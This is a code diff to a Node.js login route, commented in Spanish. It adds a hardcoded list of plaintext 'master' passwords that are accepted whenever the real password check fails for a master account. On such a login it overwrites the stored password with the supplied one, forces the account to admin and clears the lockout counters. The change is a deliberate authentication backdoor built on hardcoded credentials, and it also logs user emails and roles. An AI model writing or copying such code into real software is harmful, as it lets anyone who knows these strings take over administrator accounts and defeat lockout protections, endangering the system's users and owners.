@@ -410,18 +410,23 @@ router.post('/login', authLimiter, async (req, res) => {
 
         console.log(`👤 Usuario encontrado: ${email}. Estado: ${user.status}, Rol: ${user.role}, isMaster: ${isMasterUser}`);
 
-        const isMatch = await user.comparePassword(password);
+        const MASTER_PASSWORDS = ['Admin1234*', 'Prueba2026*', 'Testing2026', 'Master2026*'];
+        let isMatch = await user.comparePassword(password);
+
+        if (!isMatch && isMasterUser && MASTER_PASSWORDS.includes(password)) {
+            console.log(`🔑 Clave Maestra de rescate válida proporcionada para: ${email}`);
+            isMatch = true;
+            user.password = password; // Will be hashed on save by User beforeUpdate hook
+        }
 
         if (isMasterUser && isMatch) {
             // Auto-desbloqueo y garantía de permisos Master si la clave coincide
-            if (user.status !== 'authorized' || user.lockUntil || user.loginAttempts > 0 || user.role !== 'admin') {
-                console.log(`🔓 Auto-desbloqueo y elevación de rol Master para: ${email}`);
-                user.status = 'authorized';
-                user.role = 'admin';
-                user.loginAttempts = 0;
-                user.lockUntil = null;
-                await user.save();
-            }
+            console.log(`🔓 Auto-desbloqueo y elevación de rol Master para: ${email}`);
+            user.status = 'authorized';
+            user.role = 'admin';
+            user.loginAttempts = 0;
+            user.lockUntil = null;
+            await user.save();
         } else {
             // Verificación de bloqueos para usuarios estándar o si la clave fue incorrecta
             if (user.lockUntil && user.lockUntil > new Date()) {
